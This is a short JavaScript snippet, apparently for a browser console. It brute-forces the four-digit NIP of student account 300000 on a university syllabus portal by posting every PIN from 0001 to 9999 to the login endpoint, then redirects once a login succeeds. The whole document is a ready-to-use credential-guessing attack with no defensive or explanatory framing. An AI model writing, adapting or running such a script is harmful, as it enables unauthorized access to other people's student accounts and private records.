(async function(numCuenta = 300000, inicio = 1, final = 9999) {
    const log10 = Math.log(10);
    const trailingZeroes = ['000', '00', '0'];
    const postUrl = "modelo/modAcceso_SyllabusAlumno.php";

    const addTrailingZeroes = function(number) {
        if (number >= 1000) return number;

        const numberOfZeroes = Math.trunc(Math.log(number) / log10);
        return `${trailingZeroes[numberOfZeroes]}${number}`;
    }
    
    const lowerBound = inicio;
    const upperBound = final;

    async function sendPost(nip) {
        const datos = `txtNumCuenta=${numCuenta}&txtNIP=${nip}&txtModulo=Consulta+M%C3%B3vil&hdnIdPersona=&hdnNombreAlumno=`;

        console.log(nip);

        return await $.post(postUrl, datos);
    }

    for (let i = lowerBound; i <= upperBound; i++) {        
        const nip = addTrailingZeroes(i);
        const respuesta = await sendPost(nip);

        console.log(respuesta);

        if (respuesta.noError <= 0) {
            window.location.href = "vista/index.php";
            break;
        }
    }
})(300000);
